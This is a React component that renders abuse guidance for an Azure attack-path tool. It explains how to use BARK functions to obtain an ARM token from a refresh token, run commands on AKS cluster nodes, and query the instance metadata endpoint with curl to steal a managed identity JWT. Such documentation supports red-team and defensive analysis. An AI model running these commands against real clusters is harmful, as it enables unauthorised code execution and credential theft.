import React from 'react';

const Abuse = () => {
    return (
        <>
            <p>
                You can use BARK's Invoke-AzureRMAKSRunCommand function 
                to execute commands on compute nodes associated with the 
                target AKS Managed Cluster.
            </p>

            <p>
                This function requires you to supply an Azure Resource Manager
                scoped JWT associated with the principal that has the privilege
                to execute commands on the cluster. There are several ways to
                acquire a JWT. For example, you may use BARK's
                Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT
                by supplying a refresh token:
            </p>

            <pre>
                <code>
                    {
                        '$ARMToken = Get-ARMTokenWithRefreshToken `\n' +
                        '    -RefreshToken "0.ARwA6WgJJ9X2qk…" `\n' +
                        '    -TenantID "contoso.onmicrosoft.com"'
                    }
                </code>

            </pre>

            <p>
                Now you can use BARK's Invoke-AzureRMAKSRunCommand function 
                to execute a command against the target AKS Managed Cluster.
                For example, to run a simple "whoami" command:
            </p>

            <pre>
                <code>
                    {
                        'Invoke-AzureRMAKSRunCommand `\n' +
                        '    -Token $ARMToken `\n' +
                        '    -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" `\n' +
                        '    -Command "whoami"'
                    }
                </code>
            </pre>

            <p>
                If the AKS Cluster or its associated Virtual Machine Scale Sets 
                have managed identity assignments, you can use BARK's 
                Invoke-AzureRMAKSRunCommand function to retrieve a JWT for the 
                managed identity Service Principal like this:
            </p>

            <pre>
                <code>
                    {
                        'Invoke-AzureRMAKSRunCommand `\n' +
                        '    -Token $ARMToken `\n' +
                        '    -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" `\n' +
                        '    -Command \'curl -i -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&api-version=2019-08-01"\''
                    }
                </code>
            </pre>

            <p>
                If successful, the output will include a JWT for the managed identity 
                service principal.
            </p>
        </>
    );
};

export default Abuse;